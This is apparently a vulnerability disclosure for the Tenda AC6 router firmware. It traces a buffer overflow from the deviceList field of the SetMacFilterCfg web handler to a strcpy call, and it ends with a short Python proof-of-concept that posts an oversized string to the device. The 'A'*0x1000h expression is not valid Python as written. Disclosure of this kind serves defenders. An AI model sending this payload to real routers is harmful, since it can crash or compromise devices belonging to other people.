# buffer overflow

## Tenda_AC6

version: V15.03.06.51

## Description:

There is a buffer overflow in httpd/SetMacFilterCfg

## Source:

you may download it from : https://www.tendacn.com/download/detail-3794.html
## Analyse:


![](../Tenda_AC10U_V1/4.png)

get value from macFilterType , and get into if

![](../Tenda_AC10U_V1/5.png)

get value from deviceList , pass to set_macfilter_rules

![](../Tenda_AC10U_V1/6.png)

pass to set_macfilter_rules_by_one

![](../Tenda_AC10U_V1/7.png)

pass to parse_macfilter_rule

![](../Tenda_AC10U_V1/8.png)

finally call strcpy ,cause buff overflow

## POC
```
url = "http://192.168.1.13/goform/SetMacFilterCfg"
payload = 'A'*0x1000h + '\n'

r = requests.post(url, data={'deviceList': payload , 'macFilterType': 1 })
```
